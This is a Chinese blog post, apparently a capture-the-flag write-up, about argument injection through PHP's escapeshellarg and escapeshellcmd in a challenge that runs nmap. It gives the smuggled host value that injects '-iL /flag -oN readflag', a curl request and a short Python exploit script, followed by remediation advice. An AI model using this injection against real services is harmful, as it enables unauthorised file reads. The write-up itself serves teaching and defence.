@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="rowen">
+
+
+
+
+
+<title>网鼎杯 2020 朱雀组 Nmap：escapeshell 参数逃逸题解 | Hexo</title>
+
+
+
+    <link rel="icon" href="/drink.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <!-- 引入jQuery -->
+<script type="text/javascript" src="//libs.baidu.com/jquery/1.8.3/jquery.min.js"></script>
+<!-- 雪花特效2 -->
+ <script type="text/javascript" src="/js/snow2.js"></script>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+<script>
+!
+function() {
+function n(n, e, t) {
+return n.getAttribute(e) || t
+}
+function e(n) {
+return document.getElementsByTagName(n)
+}
+function t() {
+var t = e("script"),
+o = t.length,
+i = t[o - 1];
+return {
+l: o,
+z: n(i, "zIndex", -1), //置于主页面背后
+o: n(i, "opacity", .5), //线条透明度
+c: n(i, "color", "0,0,0"), //线条颜色
+n: n(i, "count", 100) //线条数量
+}
+}
+function o() {
+a = m.width = window.innerWidth ||
+document.documentElement.clientWidth || document.body.clientWidth,
+c = m.height = window.innerHeight ||
+document.documentElement.clientHeight || document.body.clientHeight
+}
+function i() {
+r.clearRect(0, 0, a, c);
+var n, e, t, o, m, l;
+s.forEach(function(i, x) {
+for (i.x += i.xa, i.y += i.ya, i.xa *= i.x > a || i.x < 0 ? -1 :
+1, i.ya *= i.y > c || i.y < 0 ? -1 : 1, r.fillRect(i.x - .5, i.y - .5, 1,
+1), e = x + 1; e < u.length; e++) n = u[e],
+null !== n.x && null !== n.y && (o = i.x - n.x, m = i.y - n.y, l
+= o * o + m * m, l < n.max && (n === y && l >= n.max / 2 && (i.x -= .03 * o,
+i.y -= .03 * m), t = (n.max - l) / n.max, r.beginPath(), r.lineWidth = t /
+2, r.strokeStyle = "rgba(" + d.c + "," + (t + .2) + ")", r.moveTo(i.x, i.y),
+r.lineTo(n.x, n.y), r.stroke()))
+}),
+x(i)
+}
+var a, c, u, m = document.createElement("canvas"),
+d = t(),
+l = "c_n" + d.l,
+r = m.getContext("2d"),
+x = window.requestAnimationFrame || window.webkitRequestAnimationFrame
+|| window.mozRequestAnimationFrame || window.oRequestAnimationFrame ||
+window.msRequestAnimationFrame ||
+function(n) {
+window.setTimeout(n, 1e3 / 45)
+},
+w = Math.random,
+y = {
+x: null,
+y: null,
+max: 2e4
+};
+m.id = l,
+m.style.cssText = "position:fixed;top:0;left:0;z-index:" + d.z +
+";opacity:" + d.o,
+e("body")[0].appendChild(m),
+o(),
+window.onresize = o,
+window.onmousemove = function(n) {
+n = n || window.event,
+y.x = n.clientX,
+y.y = n.clientY
+},
+window.onmouseout = function() {
+y.x = null,
+y.y = null
+};
+for (var s = [], f = 0; d.n > f; f++) {
+var h = w() * a,
+g = w() * c,
+v = 2 * w() - 1,
+p = 2 * w() - 1;
+s.push({
+x: h,
+y: g,
+xa: v,
+ya: p,
+max: 6e3
+})
+}
+u = s.concat([y]),
+setTimeout(function() {
+i()
+},
+100)
+} ();
+</script>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">bobo&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">📖博文</a>
+                
+                    <a class="menu-item" href="/category">📚类别</a>
+                
+                    <a class="menu-item" href="/tag">🏷️标签</a>
+                
+                    <a class="menu-item" href="/about">💡关于</a>
+                
+                    <a class="menu-item" href="/links">🔗友链</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">bobo&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">📖博文</a>
+                
+                    <a class="menu-item" href="/category">📚类别</a>
+                
+                    <a class="menu-item" href="/tag">🏷️标签</a>
+                
+                    <a class="menu-item" href="/about">💡关于</a>
+                
+                    <a class="menu-item" href="/links">🔗友链</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">网鼎杯 2020 朱雀组 Nmap：escapeshell 参数逃逸题解</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">rowen</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">May 20, 2026&nbsp;&nbsp;22:20:00</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/">比赛复现</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="网鼎杯-2020-朱雀组-Nmap：escapeshell-参数逃逸题解"><a href="#网鼎杯-2020-朱雀组-Nmap：escapeshell-参数逃逸题解" class="headerlink" title="网鼎杯 2020 朱雀组 Nmap：escapeshell 参数逃逸题解"></a>网鼎杯 2020 朱雀组 Nmap：escapeshell 参数逃逸题解</h1><h2 id="一、题目信息"><a href="#一、题目信息" class="headerlink" title="一、题目信息"></a>一、题目信息</h2><p>题目首页只有一个输入框，用来提交 <code>host</code> 参数进行扫描。页面源码中提示：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- flag is in /flag --&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>结合题目名 <code>Nmap</code>，可以判断后端大概率会调用 <code>nmap</code> 对用户输入的主机进行扫描。本题目标是通过 <code>host</code> 参数影响后端命令执行逻辑，从而读取 <code>/flag</code>。</p>
+<h2 id="二、功能分析"><a href="#二、功能分析" class="headerlink" title="二、功能分析"></a>二、功能分析</h2><p>首页表单如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;scanform&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-inline&quot;</span> <span class="attr">action</span>=<span class="string">&quot;?&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;host&quot;</span> <span class="attr">class</span>=<span class="string">&quot;input-large&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;hostname / IP&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>后端可能执行类似命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -T4 -F --host-timeout 1000ms &lt;host&gt;</span><br></pre></td></tr></table></figure>
+
+<p>同时结合 <code>/list.php</code>、<code>/result.php</code> 等页面行为，可以推测扫描结果会被保存成文件，因此后端可能还添加了输出参数。</p>
+<h2 id="三、漏洞核心"><a href="#三、漏洞核心" class="headerlink" title="三、漏洞核心"></a>三、漏洞核心</h2><p>这题的关键点有两个：</p>
+<ul>
+<li><code>nmap</code> 自带从文件读取目标的参数。</li>
+<li><code>escapeshellarg()</code> 和 <code>escapeshellcmd()</code> 连用时可能产生参数逃逸。</li>
+</ul>
+<h3 id="1-nmap-关键参数"><a href="#1-nmap-关键参数" class="headerlink" title="1. nmap 关键参数"></a>1. nmap 关键参数</h3><p><code>nmap</code> 中有两个比较关键的参数：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-iL    从文件中读取扫描目标</span><br><span class="line">-oN    以普通文本格式输出扫描结果</span><br></pre></td></tr></table></figure>
+
+<p>例如：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -iL /flag -oN readflag</span><br></pre></td></tr></table></figure>
+
+<p>这条命令会尝试把 <code>/flag</code> 文件中的内容当成扫描目标。如果 <code>/flag</code> 中是一行 <code>flag&#123;...&#125;</code>，那么 <code>nmap</code> 会把它当成主机名解析。由于它不是合法主机名，最终会在报错中回显原内容。</p>
+<h3 id="2-escapeshell-函数问题"><a href="#2-escapeshell-函数问题" class="headerlink" title="2. escapeshell 函数问题"></a>2. escapeshell 函数问题</h3><p>题目后端常见写法可能类似：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br><span class="line"><span class="variable">$host</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$host</span>);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;nmap -Pn -T4 -F --host-timeout 1000ms -oX xml/xxxx &quot;</span> . <span class="variable">$host</span>);</span><br></pre></td></tr></table></figure>
+
+<p>很多时候会误以为两个过滤函数一起使用更安全，但在这里反而可能破坏参数边界。</p>
+<p>输入：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&#x27; -iL /flag -oN readflag</span><br></pre></td></tr></table></figure>
+
+<p>经过 <code>escapeshellarg()</code> 后，输入会被当成一个整体参数包裹。再经过 <code>escapeshellcmd()</code> 时，引号和反斜杠被再次处理，原本应该作为一个参数的内容被拆开，导致后面的：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-iL /flag -oN readflag</span><br></pre></td></tr></table></figure>
+
+<p>逃逸成真正的 <code>nmap</code> 命令参数。</p>
+<h2 id="四、Payload-构造"><a href="#四、Payload-构造" class="headerlink" title="四、Payload 构造"></a>四、Payload 构造</h2><p>最终 payload：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&#x27; -iL /flag -oN readflag</span><br></pre></td></tr></table></figure>
+
+<p>含义如下：</p>
+<table>
+<thead>
+<tr>
+<th>片段</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>127.0.0.1</code></td>
+<td>原本合法的扫描目标</td>
+</tr>
+<tr>
+<td><code>&#39;</code></td>
+<td>配合过滤逻辑造成参数边界破坏</td>
+</tr>
+<tr>
+<td><code>-iL /flag</code></td>
+<td>让 nmap 从 <code>/flag</code> 读取目标</td>
+</tr>
+<tr>
+<td><code>-oN readflag</code></td>
+<td>将扫描结果写入 <code>readflag</code></td>
+</tr>
+</tbody></table>
+<h2 id="五、利用过程"><a href="#五、利用过程" class="headerlink" title="五、利用过程"></a>五、利用过程</h2><h3 id="1-浏览器提交"><a href="#1-浏览器提交" class="headerlink" title="1. 浏览器提交"></a>1. 浏览器提交</h3><p>在首页输入框提交：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&#x27; -iL /flag -oN readflag</span><br></pre></td></tr></table></figure>
+
+<p>提交后访问生成的结果文件：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/readflag</span><br></pre></td></tr></table></figure>
+
+<p>页面中可以看到类似内容：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Failed to resolve &quot;flag&#123;...&#125;&quot;.</span><br><span class="line">WARNING: No targets were specified, so 0 hosts scanned.</span><br></pre></td></tr></table></figure>
+
+<p>其中 <code>Failed to resolve</code> 后面的内容就是 <code>/flag</code> 文件内容。</p>
+<h3 id="2-curl-提交"><a href="#2-curl-提交" class="headerlink" title="2. curl 提交"></a>2. curl 提交</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST <span class="string">&quot;http://target/&quot;</span> \</span><br><span class="line">  -d <span class="string">&quot;host=127.0.0.1&#x27; -iL /flag -oN readflag&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后访问：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://target/readflag</span><br></pre></td></tr></table></figure>
+
+<h2 id="六、EXP-脚本"><a href="#六、EXP-脚本" class="headerlink" title="六、EXP 脚本"></a>六、EXP 脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://target/&quot;</span></span><br><span class="line">payload = <span class="string">&quot;127.0.0.1&#x27; -iL /flag -oN readflag&quot;</span></span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">s.post(url, data=&#123;<span class="string">&quot;host&quot;</span>: payload&#125;, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">res = s.get(url + <span class="string">&quot;readflag&quot;</span>).text</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line">flag = re.search(<span class="string">r&quot;flag\&#123;.*?\&#125;&quot;</span>, res)</span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;flag =&quot;</span>, flag.group(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>
+
+<h2 id="七、修复建议"><a href="#七、修复建议" class="headerlink" title="七、修复建议"></a>七、修复建议</h2><p>从真实开发角度看，这类问题应该这样修复：</p>
+<ul>
+<li>不要把用户输入直接拼接进系统命令。</li>
+<li>如果必须调用命令行工具，应使用参数数组方式传参。</li>
+<li>对 <code>host</code> 做严格白名单校验，只允许合法 IP 或域名。</li>
+<li>不要混用 <code>escapeshellarg()</code> 和 <code>escapeshellcmd()</code> 来“叠加安全”。</li>
+<li>输出文件名由后端生成，不允许用户控制。</li>
+</ul>
+<h2 id="八、总结"><a href="#八、总结" class="headerlink" title="八、总结"></a>八、总结</h2><p>这题不是简单的命令拼接，而是利用了 <code>nmap</code> 参数能力和 PHP 过滤函数连用后的参数逃逸问题。最终通过 <code>-iL /flag</code> 读取 flag，再通过 <code>-oN readflag</code> 将错误信息写入 Web 可访问文件，从而完成文件读取。</p>
+<p>这类题提醒我：安全过滤不能只看“有没有调用过滤函数”，还要看过滤函数的使用顺序、命令参数边界和被调用工具自身的功能。</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>rowen</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://forkmmat.github.io/2026/05/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap%E5%8F%82%E6%95%B0%E9%80%83%E9%80%B8%E9%A2%98%E8%A7%A3/">https://forkmmat.github.io/2026/05/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap%E5%8F%82%E6%95%B0%E9%80%83%E9%80%B8%E9%A2%98%E8%A7%A3/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/Web%E5%AE%89%E5%85%A8/"># Web安全</a>
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"># 命令执行</a>
+                    
+                        <a href="/tags/%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5/"># 参数注入</a>
+                    
+                        <a href="/tags/PHP/"># PHP</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2026/05/20/CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Web11-Smarty-SSTI%E9%A2%98%E8%A7%A3/">CISCN2019 华东南赛区 Web11：Smarty SSTI 题解</a>
+            
+            
+            <a class="next" rel="next" href="/2026/05/20/%E5%9F%BA%E4%BA%8EPython%E7%9A%84Web%E6%97%A5%E5%BF%97%E6%94%BB%E5%87%BB%E7%89%B9%E5%BE%81%E6%8F%90%E5%8F%96%E5%B7%A5%E5%85%B7/">基于 Python 的 Web 日志攻击特征提取工具</a>
+            
+        </section>
+<script src="https://giscus.app/client.js"
+        data-repo="forkmmat/forkmmat.github.io"
+        data-repo-id="R_kgDOO0OA0g"
+        data-category="General"
+        data-category-id="DIC_kwDOO0OA0s4CtD6Y"
+        data-mapping="title"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="top"
+        data-theme="preferred_color_scheme"
+        data-lang="zh-CN"
+        data-loading="lazy"
+        crossorigin="anonymous"
+        async>
+</script>
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© rowen | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
